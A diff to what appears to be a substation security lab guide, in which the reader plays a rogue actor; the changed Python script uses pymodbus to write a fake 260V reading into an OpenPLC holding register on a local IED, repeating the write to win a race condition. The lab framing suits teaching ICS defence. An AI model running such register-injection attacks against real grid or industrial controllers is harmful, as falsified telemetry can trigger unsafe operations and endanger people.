@@ -98,13 +98,17 @@ You will now act as a rogue actor on the substation network. We will inject a fa
     ```bash
     cat << 'EOF' > /tmp/hack.py
     from pymodbus.client import ModbusTcpClient
+    import time
     
     # 5020 is the default external Modbus port mapped to the first IED
     c = ModbusTcpClient("127.0.0.1", port=5020) 
     c.connect()
     
-    # Inject 260V (26000) into Holding Register 0 (%MW0)
-    c.write_register(0, 26000) 
+    # Inject 260V (26000) into Holding Register 1024 (%MW0 offset in OpenPLC)
+    # Spam it for 2.5 seconds to ensure we win the execution race condition
+    for _ in range(50):
+        c.write_register(1024, 26000) 
+        time.sleep(0.05)
     
     print("ATTACK SUCCESS: Faked voltage telemetry set to 260V")
     c.close()
